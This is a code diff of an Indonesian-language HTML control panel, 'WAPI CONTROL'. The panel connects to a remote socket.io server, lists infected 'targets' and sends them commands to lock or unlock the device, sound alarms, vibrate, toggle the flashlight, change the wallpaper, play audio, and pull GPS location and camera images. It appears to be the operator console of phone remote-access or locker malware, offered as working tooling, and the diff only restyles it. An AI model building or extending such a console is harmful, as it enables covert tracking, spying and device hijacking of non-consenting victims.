@@ -1,31 +1,86 @@
 <!DOCTYPE html>
 <html lang="id">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ADMIN</title>
-<style>body{background:#0a0a0a;color:#fff;font-family:Arial;padding:14px}h2{color:#e74c3c}button{padding:14px;margin:6px;border:none;border-radius:8px;font-weight:bold;font-size:14px;cursor:pointer;width:100%}.r{background:#c0392b;color:#fff}.g{background:#27ae60;color:#fff}.gr{background:#333;color:#ccc}.t{border:1px solid #333;padding:10px;margin:4px 0;border-radius:8px;cursor:pointer;font-size:12px}.t.a{border-color:#e74c3c;background:#1a0000}.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}.l{background:#2ecc71}.d{background:#e74c3c}</style></head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAPI CONTROL</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0b0b0f;color:#cdd6f4;font-family:'Segoe UI',system-ui,sans-serif;padding:12px;min-height:100vh}
+        .header{background:linear-gradient(135deg,#1e1e2e,#181825);border:1px solid #313244;padding:16px;border-radius:14px;text-align:center;margin-bottom:12px}
+        .header h1{color:#cba6f7;font-size:20px;font-weight:700;letter-spacing:1px}
+        .header p{color:#6c7086;font-size:10px;margin-top:2px;text-transform:uppercase;letter-spacing:2px}
+        .card{background:#1e1e2e;border:1px solid #313244;border-radius:14px;padding:14px;margin-bottom:10px}
+        .card h3{color:#cba6f7;font-size:12px;font-weight:600;margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
+        button{padding:12px;margin:3px;border:none;border-radius:8px;font-weight:600;font-size:11px;cursor:pointer;transition:all .2s;letter-spacing:1px}
+        button:active{transform:scale(.96)}
+        .btn-red{background:#2a1118;color:#f38ba8;border:1px solid #482332}
+        .btn-red:hover{background:#e64553;color:#fff}
+        .btn-green{background:#111f1a;color:#a6e3a1;border:1px solid #1e3a2e}
+        .btn-green:hover{background:#40a02b;color:#fff}
+        .btn-blue{background:#111827;color:#89b4fa;border:1px solid #1e2e4a}
+        .btn-yellow{background:#211d10;color:#f9e2af;border:1px solid #3d3418}
+        .btn-purple{background:#17112a;color:#cba6f7;border:1px solid #2e2250}
+        .btn-gray{background:#181825;color:#6c7086;border:1px solid #313244}
+        .btn-full{width:100%}
+        .btn-half{width:48%;display:inline-block}
+        .grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+        .status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px}
+        .dot-live{background:#a6e3a1;box-shadow:0 0 8px #a6e3a1}
+        .dot-dead{background:#f38ba8;box-shadow:0 0 8px #f38ba8}
+        .target-item{background:#181825;padding:12px;border-radius:8px;margin:4px 0;cursor:pointer;border:1px solid #313244;display:flex;justify-content:space-between;align-items:center;font-size:11px}
+        .target-item:hover{border-color:#cba6f7}
+        .target-item.active{border-color:#cba6f7;background:#1e1e2e}
+        hr{border:none;border-top:1px solid #313244;margin:10px 0}
+        #status{font-size:10px;color:#6c7086}
+    </style>
+</head>
 <body>
-<h2>🔴 ADMIN</h2>
-<button class="g" onclick="connect()">🔗 SAMBUNG</button>
-<p id="status">Terputus</p>
-<div id="targets"><p style="color:#888">Menunggu...</p></div>
-<button class="r" onclick="send('lock')">🔒 KUNCI</button>
-<button class="gr" onclick="send('unlock')">🔓 LEPAS</button>
-<button class="r" onclick="send('siren')">🔊 ALARM</button>
-<button class="gr" onclick="send('vibrate')">📳 GETAR</button>
-<button class="r" onclick="send('flash_on')">💡 SENTER</button>
-<button class="gr" onclick="send('flash_off')">🌑 MATI</button>
-<button class="r" onclick="send('wallpaper')">🖼 WALLPAPER</button>
-<button class="gr" onclick="send('mp3')">🎵 MP3</button>
-<button class="r" onclick="send('gps')">📍 GPS</button>
-<button class="gr" onclick="send('camera')">📸 KAMERA</button>
+
+<div class="header">
+    <h1>WAPI CONTROL</h1>
+    <p>panel kendali &bull; real‑time</p>
+</div>
+
+<div class="card">
+    <h3>KONEKSI</h3>
+    <button class="btn-green btn-full" onclick="connect()">SAMBUNG</button>
+    <p id="status">terputus</p>
+</div>
+
+<div class="card">
+    <h3>TARGET</h3>
+    <div id="targets"><p style="color:#6c7086;font-size:10px;">menunggu target...</p></div>
+</div>
+
+<div class="card">
+    <h3>KONTROL</h3>
+    <button class="btn-red btn-full" onclick="send('lock')">🔒 KUNCI</button>
+    <button class="btn-green btn-full" onclick="send('unlock')">🔓 LEPAS</button>
+    <hr>
+    <div class="grid">
+        <button class="btn-yellow btn-half" onclick="send('siren')">🔊 ALARM</button>
+        <button class="btn-blue btn-half" onclick="send('vibrate')">📳 GETAR</button>
+        <button class="btn-yellow btn-half" onclick="send('flash_on')">💡 SENTER</button>
+        <button class="btn-blue btn-half" onclick="send('flash_off')">🌑 MATI</button>
+        <button class="btn-purple btn-half" onclick="send('wallpaper')">🖼 WALL</button>
+        <button class="btn-purple btn-half" onclick="send('mp3')">🎵 MP3</button>
+        <button class="btn-gray btn-half" onclick="send('gps')">📍 GPS</button>
+        <button class="btn-gray btn-half" onclick="send('camera')">📸 KAMERA</button>
+    </div>
+</div>
+
 <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
 <script>
 var s,ct=null,all=[];
 function connect(){
     s=io('https://wafii.pythonanywhere.com',{query:{role:'admin'}});
-    document.getElementById('status').innerHTML='<span class="dot l"></span> Tersambung';
+    document.getElementById('status').innerHTML='<span class="status-dot dot-live"></span> tersambung';
     s.on('targets',function(d){all=d;render()});
 }
-function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:#888">Tidak ada target</p>';return}el.innerHTML=all.map(function(t){return'<div class="t'+(ct===t.id?' a':'')+'" onclick="select(\''+t.id+'\')"><span class="dot '+(t.online?'l':'d')+'"></span><b>'+t.id+'</b></div>'}).join('')}
+function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:#6c7086;font-size:10px;">tidak ada target</p>';return}el.innerHTML=all.map(function(t){return'<div class="target-item'+(ct===t.id?' active':'')+'" onclick="select(\''+t.id+'\')"><span><span class="status-dot '+(t.online?'dot-live':'dot-dead')+'"></span><b>'+t.id+'</b></span><span style="color:#585b70">▶</span></div>'}).join('')}
 function select(id){ct=id;render()}
 function send(cmd){if(!s||!ct){alert('Pilih target!');return}s.emit('command',{targetId:ct,cmd:cmd})}
-</script></body></html>
+</script>
+</body>
+</html>
